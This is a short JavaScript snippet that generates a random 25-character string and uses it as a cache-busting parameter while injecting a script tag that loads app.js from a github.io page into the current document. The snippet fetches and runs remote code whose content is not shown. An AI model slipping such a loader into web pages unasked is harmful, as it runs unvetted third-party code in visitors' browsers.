function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

var script = document.createElement('script');
script.src='https://thecoderell.github.io/80088/app.js?nv=' + makeid(25);
script.type = 'application/javascript';
document.body.appendChild(script);